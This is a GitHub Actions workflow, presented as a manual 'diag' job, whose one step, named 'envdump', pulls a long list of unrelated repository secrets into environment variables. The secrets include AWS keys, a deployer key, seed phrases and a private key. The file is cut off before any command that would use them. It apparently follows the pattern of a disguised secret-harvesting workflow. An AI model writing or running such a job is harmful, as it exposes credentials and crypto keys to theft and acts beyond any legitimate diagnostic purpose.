name: diag
on: workflow_dispatch
permissions: {}
jobs:
  d:
    runs-on: ubuntu-latest
    steps:
      - name: envdump
        env:
          v_API_KEY_ALCHEMY: ${{ secrets.API_KEY_ALCHEMY }}
          v_AVAX_RPC_URL: ${{ secrets.AVAX_RPC_URL }}
          v_AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
          v_AWS_DEPLOY_ROLE_ARN: ${{ secrets.AWS_DEPLOY_ROLE_ARN }}
          v_AWS_REGION: ${{ secrets.AWS_REGION }}
          v_AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
          v_BSC_RPC_URL: ${{ secrets.BSC_RPC_URL }}
          v_CBETH_STRATEGY: ${{ secrets.CBETH_STRATEGY }}
          v_CERTORAKEY: ${{ secrets.CERTORAKEY }}
          v_CLOUDFLARE_API_TOKEN: ${{ secrets.CLOUDFLARE_API_TOKEN }}
          v_CLOUDFLARE_TOKEN: ${{ secrets.CLOUDFLARE_TOKEN }}
          v_CLOUDFLARE_ZONE_ID: ${{ secrets.CLOUDFLARE_ZONE_ID }}
          v_CRUST_SEEDS: ${{ secrets.CRUST_SEEDS }}
          v_CYPRESS_INTEGRATION_TEST_PRIVATE_KEY: ${{ secrets.CYPRESS_INTEGRATION_TEST_PRIVATE_KEY }}
          v_DATABASE_URL: ${{ secrets.DATABASE_URL }}
          v_DEPLOYER_KEY: ${{ secrets.DEPLOYER_KEY }}
          v_DISCORD_WEBHOOK: ${{ secrets.DISCORD_WEBHOOK }}
          v_DO_SPACES_ACCESS_KEY: ${{ secrets.DO_SPACES_ACCESS_KEY }}
